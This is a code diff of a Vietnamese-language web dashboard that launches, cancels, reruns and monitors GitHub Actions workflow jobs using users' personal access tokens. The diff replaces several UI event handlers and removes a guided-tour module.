-    el.refreshBtn.addEventListener('click', async () => { /* ... Unchanged ... */ const icon = el.refreshBtn.querySelector('i'); icon.classList.add('fa-spin'); UI.showToast("Refreshing statuses..."); await pollJobStatuses(); setTimeout(() => icon.classList.remove('fa-spin'), 500); });
-    el.themeToggleBtn.addEventListener('click', () => { /* ... Unchanged ... */ const newTheme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark'; document.documentElement.dataset.theme = newTheme; localStorage.setItem('theme', newTheme); el.themeToggleBtn.innerHTML = newTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>'; });
-    el.templateSelect.addEventListener('change', UI.updateTemplateView);
-    [el.tokenInput, el.accessPinInput].forEach(input => input.addEventListener('input', State.save));
-    [el.accessPinInput, el.customRepoUrl, el.deployCmdInput].forEach(input => input.addEventListener('focus', () => input.select()));
-    el.copyCmdBtn.addEventListener('click', () => { navigator.clipboard.writeText(el.deployCmdInput.value); UI.showToast('Command copied!', 'success'); el.copyCmdBtn.innerHTML = '<i class="fas fa-check"></i>'; setTimeout(() => el.copyCmdBtn.innerHTML = '<i class="fas fa-copy"></i>', 1500); });
-    el.modalCloseBtn.addEventListener('click', UI.modal.close);
-    el.modalOverlay.addEventListener('click', UI.modal.close);
-    document.addEventListener('keydown', (e) => { if (e.key === "Escape") UI.modal.close(); });
-    window.addEventListener('online', () => el.offlineBanner.classList.add('hidden'));
-    window.addEventListener('offline', () => el.offlineBanner.classList.remove('hidden'));
-    if (!navigator.onLine) el.offlineBanner.classList.remove('hidden');
-    el.tokenInput.addEventListener('dragover', (e) => { e.preventDefault(); el.tokenInput.classList.add('drag-over'); });
-    el.tokenInput.addEventListener('dragleave', () => el.tokenInput.classList.remove('drag-over'));
-    el.tokenInput.addEventListener('drop', (e) => { e.preventDefault(); el.tokenInput.classList.remove('drag-over'); if (e.dataTransfer.files.length) { const file = e.dataTransfer.files[0]; if (file.type === 'text/plain') { const reader = new FileReader(); reader.onload = (ev) => { el.tokenInput.value = ev.target.result; State.save(); }; reader.readAsText(file); } } });
-    el.tokenHelpBtn.addEventListener('click', UI.modal.showTokenHelp);
-    el.startTourBtn.addEventListener('click', () => Tour.start());
-});
+    el.jobListContainer.addEventListener('click', async e => {
+        const ownerHeader = e.target.closest('.owner-header');
+        if (ownerHeader) {
+            const owner = ownerHeader.dataset.owner; const content = el.jobListContainer.querySelector(`.owner-jobs-content[data-owner="${owner}"]`); const icon = ownerHeader.querySelector('.chevron-icon');
+            content.classList.toggle('hidden'); icon.classList.toggle('fa-chevron-down'); icon.classList.toggle('fa-chevron-up');
+            return;
+        }
+        const jobTempId = e.target.closest('[data-job-temp-id]')?.dataset.jobTempId; if (!jobTempId) return;
+        const job = trackedJobs.find(j => j.tempId === jobTempId); if (!job) return;
+        const cancelBtn = e.target.closest('.cancel-btn'); const rerunBtn = e.target.closest('.rerun-btn'); const jobItem = e.target.closest('.job-item-clickable');
+        if (e.target.matches('.job-checkbox')) { const allBoxes = document.querySelectorAll('.job-checkbox'); const checkedBoxes = document.querySelectorAll('.job-checkbox:checked'); el.selectAllCheckbox.checked = allBoxes.length > 0 && allBoxes.length === checkedBoxes.length; return; }
+        if (!job.id) { if (cancelBtn || rerunBtn) showToast("Job chưa có ID từ GitHub.", "warning"); return; }
+        if (cancelBtn) { e.stopPropagation(); if (confirm(`Bạn có chắc muốn hủy job #${job.id} của user ${job.owner}?`)) { showToast('Đang hủy job...', 'info'); try { await cancelWorkflow(job.token, job.owner, job.id); job.status = 'completed'; job.conclusion = 'cancelled'; renderJobs(); saveState(); showToast('Job đã được hủy.', 'success'); } catch (err) { showToast(`Lỗi khi hủy: ${err.message}`, 'error');} } }
+        else if (rerunBtn) { e.stopPropagation(); try { await rerunWorkflow(job.token, job.owner, job.id); showToast('Đang yêu cầu chạy lại job...', 'info'); startPolling(); } catch (err) { showToast(`Lỗi khi chạy lại: ${err.message}`, 'error'); } }
+        else if (jobItem) { showJobDetails(job); }
+    });
 
-// --- MODULE: Guided Tour ---
-const Tour = { steps: [ { element: el.tokenInput.parentElement, title: "Bước 1: Nhập Token", content: "Dán GitHub Personal Access Token của bạn vào đây. Bạn có thể dán nhiều token, mỗi token một dòng. Nhấn nút 'Cần giúp đỡ?' để xem hướng dẫn chi tiết." }, { element: el.templateSection, title: "Bước 2: Chọn Template", content: "Chọn loại máy ảo bạn muốn tạo. Một mô tả chi tiết sẽ hiện ra bên dưới để giải thích chức năng của từng loại." }, { element: el.deployActionsContainer, title: "Bước 3: Chạy Job", content: "Sử dụng các nút này để bắt đầu quá trình build. Mỗi nút tương ứng với một số lượng job khác nhau." }, { element: el.dashboard, title: "Tổng quan", content: "Bảng điều khiển này cho bạn cái nhìn nhanh về trạng thái của tất cả các job. Bạn có thể nhấn vào từng mục để lọc danh sách bên dưới." }, { element: el.historyControls, title: "Quản lý Lịch sử", content: "Sử dụng các công cụ này để làm mới, xóa, hoặc hủy hàng loạt các job trong danh sách." } ], currentStep: 0, start: function() { this.currentStep = 0; el.tourOverlay.classList.add('show'); this.showStep(); }, showStep: function() { const step = this.steps[this.currentStep]; step.element.classList.add('tour-step'); const tooltip = document.createElement('div'); tooltip.className = 'tour-tooltip'; tooltip.innerHTML = `<h4 class="font-bold text-lg mb-2">${step.title}</h4> <p class="text-sm mb-4">${step.content}</p> <div class="flex justify-between items-center"> <button class="tour-next-btn text-white bg-[var(--accent-color)] px-4 py-1 rounded-md">${this.currentStep === this.steps.length - 1 ? 'Hoàn thành' : 'Tiếp theo'}</button> <button class="tour-skip-btn text-xs text-[var(--text-secondary)]">Bỏ qua</button> </div>`; document.body.appendChild(tooltip); const rect = step.element.getBoundingClientRect(); tooltip.style.top = `${rect.bottom + 10}px`; tooltip.style.left = `${rect.left}px`; tooltip.querySelector('.tour-next-btn').onclick = () => this.next(); tooltip.querySelector('.tour-skip-btn').onclick = () => this.end(); }, next: function() { const current = this.steps[this.currentStep]; current.element.classList.remove('tour-step'); document.querySelector('.tour-tooltip').remove(); this.currentStep++; if (this.currentStep < this.steps.length) { this.showStep(); } else { this.end(); } }, end: function() { const current = this.steps[this.currentStep]; if (current) current.element.classList.remove('tour-step'); const tooltip = document.querySelector('.tour-tooltip'); if (tooltip) tooltip.remove(); el.tourOverlay.classList.remove('show'); } };
+    el.templateSelect.addEventListener('change', updateUIForTemplate);
+    [el.tokenInput, el.accessPinInput].forEach(input => input.addEventListener('change', saveState));
+    el.modalCloseBtn.addEventListener('click', closeModal);
+    el.modalOverlay.addEventListener('click', closeModal);
+});
 </script>
 </body>
 </html>
